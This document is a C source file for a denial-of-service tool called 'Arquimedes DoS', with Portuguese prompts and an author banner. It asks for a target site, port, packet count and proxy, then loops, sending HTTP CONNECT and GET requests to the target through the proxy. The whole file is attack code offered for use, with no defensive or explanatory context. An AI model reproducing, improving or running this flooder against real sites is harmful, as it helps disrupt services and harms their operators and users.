#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>

void banner() {
    printf(
        "   _                   _                    _           \n"
        "  /_\\  _ __ __ _ _   _(_)_ __ ___   ___  __| | ___  ___ \n"
        " //_\\\\| '__/ _` | | | | | '_ ` _ \\ / _ \\/ _` |/ _ \\/ __|\n"
        "/  _  \\ | | (_| | |_| | | | | | | |  __/ (_| |  __/\\__ \\\n"
        "\\_/ \\_/_|  \\__, |\\__,_|_|_| |_| |_|\\___|\\__,_|\\___||___/\n"
        "             |_|                                        \n"
        "    ___      __                                         \n"
        "   /   \\___ / _\\                                        \n"
        "  / /\\ / _ \\\\ \\                                         \n"
        " / /_// (_) |\\ \\                                        \n"
        "/___,' \\___/\\__/                                        \n"
        "\n"
        "🌀 Arquimedes Dos 🌀\n"
        "🪓 By Jhon Lamdenberguer 🪓\n"
        "📱 Team Família Flodder Techno 📱\n"
        "============================\n"
    );
}

int main() {
    char host[256];
    int port;
    int total_packets;
    char proxy_ip[100];
    int proxy_port;

    banner();

    printf("∆tack DoS Arquimedes\n");
    printf("Domínio do site -> ");
    scanf("%255s", host);
    printf("Porta do site -> ");
    scanf("%d", &port);
    printf("Quantidade de packtes -> ");
    scanf("%d", &total_packets);
    printf("Ip da sua proxy -> ");
    scanf("%99s", proxy_ip);
    printf("Porta da sua proxy -> ");
    scanf("%d", &proxy_port);

    printf("Ataque iníciado...\n");

    struct sockaddr_in proxy_addr;
    int sock;
    char request[1024];

    for (int i = 1; i <= total_packets; i++) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        proxy_addr.sin_family = AF_INET;
        proxy_addr.sin_port = htons(proxy_port);
        proxy_addr.sin_addr.s_addr = inet_addr(proxy_ip);

        if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
            close(sock);
            continue;
        }

        snprintf(request, sizeof(request),
                 "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n",
                 host, port, host, port);
        send(sock, request, strlen(request), 0);
        recv(sock, request, sizeof(request), 0); // ler resposta da proxy

        snprintf(request, sizeof(request),
                 "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", host);
        send(sock, request, strlen(request), 0);

        printf("Arquimedes DoS.c ---> %d Packtes enviados para %s porta %d\n", i, host, port);
        close(sock);
        usleep(100000); // delay de 0.1 segundos
    }

    return 0;
}
